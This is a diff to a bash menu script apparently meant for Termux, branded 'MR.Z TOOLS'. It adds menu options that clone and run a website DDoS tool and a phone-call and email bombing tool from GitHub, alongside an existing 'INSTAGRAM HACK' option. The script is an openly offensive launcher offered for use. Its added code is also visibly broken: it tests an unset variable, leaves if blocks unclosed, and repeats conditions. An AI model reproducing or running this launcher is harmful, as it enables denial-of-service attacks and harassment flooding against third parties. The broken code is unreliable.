@@ -11,14 +11,17 @@ echo -e $kiddes "#########################################"
 echo "  # CYBER TEAM # " | lolcat
 echo "  # CREATED BY : MR.Z# " | lolcat
 echo $red "  # >>DON'T REEDIT MY SCRIPT,YOU CAN GET ERROR<< # " | lolcat
+echo "  # THANK'S FOR USE THIS TOOLS!!  # " | lolcat
 echo "  # GOOD LUCK!! # " | lolcat
 echo -e $kiddes "#########################################"
 echo " NOW YOU CAN SELECT THE TOOLS MR.Z"  | lolcat
-echo -e $kiddies"=======================================" 
+echo -e $kiddies"===============================================" 
 echo " [1] INSTAGRAM BOT"  | lolcat
 echo " [2] INSTAGRAM HACK" | lolcat
 echo " [3] PLAY MUSIC YOUTUBE" | lolcat
-echo -e $kiddies"======================================="
+echo " [4] BOM TELEPHONE & MAIL"  | lolcat
+echo " [5] INSTALL TOOLS HAMMER FOR DDOS WEBSITE" | lolcat
+echo -e $kiddies"==============================================="
 read -p " [CHOSE TOOLS NUMBER]> " insta;
 
 if [ $insta = 1 ] || [ $insta = 1 ]
@@ -39,8 +42,8 @@ clear
 cowsay -f kiss.cow "MR.Z TOOLS" | lolcat
 figlet "MR.Z TOOLS" | lolcat
 sleep 1
-apt update && apt upgrade
-apt install pip
+pkg update && pkg upgrade
+pkg install pip
 pkg install python
 pkg install python2
 pip install mps_youtube
@@ -49,3 +52,23 @@ pkg install mpv
 mpsyt
 fi
 
+if [ $mrz = 5 ] || [ $mrz = 5 ]
+then
+pkg update && pkg upgrade
+pkg install python
+pkg install git
+git clone http://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+
+if [ $mrz = 4 ] || [ $mrz = 4 ]
+then
+pkg update && pkg upgrade
+pkg install git nano
+pkg install python2
+pip2 install request
+pip2 install mechanize
+git clone https://github.com/Senitopeng/Boom-CallMail.git
+cd Boom-CallMail
+nano No.txt
+python2 Boom.py
